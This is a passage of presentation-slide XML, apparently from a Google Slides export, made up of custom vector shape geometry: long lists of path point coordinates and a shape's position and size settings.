                  <a:lnTo>
                    <a:pt x="5796" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="4695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="4695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6529" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6529" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6529" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6639" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6676" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6749" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="4695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7263" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7336" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7373" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7556" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="4695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="5722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="5979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="5979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8033" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="5502"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="5612"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8253" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8253" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8290" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8363" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9537" y="5722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="6419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8840" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9537" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="6419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="7116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9757" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10931" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="7226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10931" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10931" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10931" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11041" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11261" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11628" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11628" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="9647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11591" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11628" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11958" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12178" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12068" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11848" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12068" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12215" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12178" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12178" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12215" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="12068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="12288"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12435" y="12398"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="12398"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="12288"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="12545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="12398"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="12068"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13095" y="11738"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13132" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13132" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13132" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13095" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="9060"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11885" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11628" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11041" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9060" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097"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1" name="Google Shape;301;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6537275" y="2750650"/>
              <a:ext cx="459450" cy="475050"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="18378" h="19002" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="13793" y="5429"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13682" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13572" y="5502"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13352" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13352" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13352" y="5979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13389" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13572" y="5979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="5502"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="5429"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13242" y="6089"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13169" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12875" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12875" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13132" y="6639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13242" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13352" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13389" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13242" y="6089"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="17241" y="6419"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="17534" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17497" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17387" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17351" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17241" y="6419"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12692" y="6786"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12582" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12435" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="7116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="7226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12875" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12875" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12765" y="6786"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="17571" y="6750"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="17828" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18048" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17828" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17828" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17864" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17828" y="7116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17828" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17754" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17681" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17644" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17681" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17644" y="7226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17607" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17534" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17534" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17534" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17131" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17167" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17241" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17387" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17387" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17387" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17461" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17497" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17534" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17534" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17497" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17571" y="6750"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="16874" y="8840"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="16947" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="8950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="8840"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11445" y="8584"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11408" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11555" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="8584"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="16580" y="8804"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="16580" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16580" y="9060"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16617" y="9170"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16654" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16360" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16324" y="9170"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16324" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16580" y="8804"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="16067" y="9391"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="16067" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16103" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16177" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15993" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15920" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15957" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15920" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15847" y="9757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15810" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16067" y="9391"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9611" y="2348"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9574" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="5832"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6309" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8437" y="8363"/>
                  </a:lnTo>
